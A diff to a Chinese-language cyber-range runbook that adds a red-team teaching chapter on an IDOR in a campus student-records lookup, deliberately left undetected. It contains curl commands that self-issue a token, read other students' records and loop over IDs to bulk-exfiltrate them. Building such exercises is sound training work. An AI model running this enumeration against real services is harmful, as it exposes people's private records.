@@ -1,10 +1,11 @@
-# Runbook —— 靶機真攻擊鏈（票 #44 / #45 / #46；CH2/CH3/CH4 見 #153）
+# Runbook —— 靶機真攻擊鏈（票 #44 / #45 / #46；CH2/CH3/CH4/FINAL 見 #153）
 
 單機縱深攻擊鏈：**HTTP SQLi → 撈 dbadmin 帳密 → 直連 :3306 → 讀 flag**（CH1）。
 本檔是操作與驗收手冊；結構契約由 `tests/deploy/test_target_attack_surface.py`（T1，在 CI）證，
 真打進去／真拿 flag／真重烤由下方 T4 在大主機證。CH2（校園海報上傳 → Web Shell →
-本機提權）、CH3（網址預覽 SSRF → metadata 憑證竊取 → API pivot）與 CH4（報修
-診斷工具指令注入 → cron 持久化）見本檔下方獨立段落。
+本機提權）、CH3（網址預覽 SSRF → metadata 憑證竊取 → API pivot）、CH4（報修
+診斷工具指令注入 → cron 持久化）與 FINAL（學生資料自助查詢 IDOR）見本檔下方
+獨立段落。Campaign Pack v1（#153）五章到此全數落地。
 
 ## 操作規則（先讀這條）
 
@@ -287,6 +288,76 @@ golden VM 是否確實安裝了 cron daemon（Ubuntu cloud image 通常內建，
 檔案被寫入」這個可觀測狀態，即使 cron daemon 缺席也不影響；但「持久化真的在
 重開機後觸發」這個敘事宣稱需要 T4 上機驗證（`systemctl status cron` +
 實際等一個 cron tick 確認 marker 檔案出現）。
+
+---
+
+# FINAL The Leak —— 校園學生資料自助查詢 IDOR（#153 Campaign Pack v1）
+
+單機縱深攻擊鏈：**自助登入宣告身分即核發 token（不驗身分）→ 同一個 token 讀取
+「別人」的資料（IDOR）→ 批次帶走多筆**。這是刻意的 **detection-gap 教學章節**：
+`/students/token` 有偵測覆蓋（T1087 帳號列舉），但真正有教學意義的兩步——IDOR
+讀取（T1213）、批次外洩（T1567）——**刻意零覆蓋**。結構契約與**真攻擊鏈本身**
+都由 `tests/deploy/test_range_target_idor.py`（真 HTTP round-trip，不需要 VM，在 CI）
+證。全程無寫檔，`reset_scope=exercise`。
+
+## 二分：可計分 vs fixture
+
+| 端點 | 類別 | 說明 |
+|---|---|---|
+| `/students/token` `/students/<id>/records` | **可計分**（#153 FINAL） | 真 IDOR，紅隊要真的打 |
+| `/exec` `/readsecret` `/uncovered` `/healthz`、`/poster/*`、`/preview` `/internal/reports`、`/diagnostics/lookup` | fixture / CH2 / CH3 / CH4 | 與既有章節共用，行為不變 |
+
+## 攻擊面的信任邊界（為什麼「有登入」不等於「查得到自己的」）
+
+- `/students/token?student_id=<raw>` 宣告自己是誰就核發 token——**沒有密碼、沒有
+  任何身分證明**。這不是弱驗證被繞過，是這層驗證本身就不存在。
+- `/students/<id>/records?token=<t>` 只檢查 token「曾經核發過」，**不檢查這個
+  token 原本核發給誰**。這正是 IDOR：認證存在（有沒有合法 token），物件層
+  授權不存在（這筆資料是不是你的）。
+- 每次讀取都會寫進 app log（含 `idor_cross_id_access` 稽核欄位），但**沒有任何
+  Grafana 規則**會為這些請求告警——它們在 log 裡長得跟正常使用一模一樣。
+
+## 真環境操作
+
+```bash
+# 第一跳：自助核發 token，宣告自己是 s1001（不需要密碼）
+TOKEN=$(curl -s "http://10.167.20.10/students/token?student_id=s1001")
+
+# 讀自己的資料（正常使用）
+curl -s "http://10.167.20.10/students/s1001/records?token=$TOKEN"
+
+# 第二跳：用同一個 token 讀別人的資料（IDOR 成立那一刻）
+curl -s "http://10.167.20.10/students/s9999/records?token=$TOKEN"
+
+# 第三跳：批次帶走一整批
+for i in $(seq 1000 1050); do
+  curl -s "http://10.167.20.10/students/s$i/records?token=$TOKEN"
+done
+```
+
+## 負向驗收
+
+```bash
+# 沒有 token 或亂填：401
+curl -s -o /dev/null -w '%{http_code}\n' "http://10.167.20.10/students/s1001/records?token=not-real"
+#   → 401
+
+# 短時間內對 /students/token 打超過 5 次不同 student_id：應觸發 AccountDiscoveryTarget
+for i in $(seq 1 10); do
+  curl -s "http://10.167.20.10/students/token?student_id=probe$i" >/dev/null
+done
+# 這一步**應該**被藍隊看見；接下來的 IDOR 讀取（第二跳／第三跳）**不會**被看見——
+# 這正是本章要示範的落差。
+```
+
+## 對照表：Campaign Pack v1 四條新章節的偵測覆蓋層次
+
+| Chapter | 覆蓋程度 | 用意 |
+|---|---|---|
+| CH2 Foothold | 全覆蓋 | 對照組：攻擊被完整看見長什麼樣 |
+| CH3 The Stolen Key | 部分覆蓋（1 個 gap） | 讀到憑證有覆蓋，使用憑證的證據較弱 |
+| CH4 Ghost in the System | 全覆蓋 | 持久化被完整看見 |
+| FINAL The Leak | 兩個 gap（僅早期偵察有覆蓋） | 核心教學案例：行為模式異常，signature-based 規則抓不到 |
 
 ## T3 —— range 契約（防火牆）
 
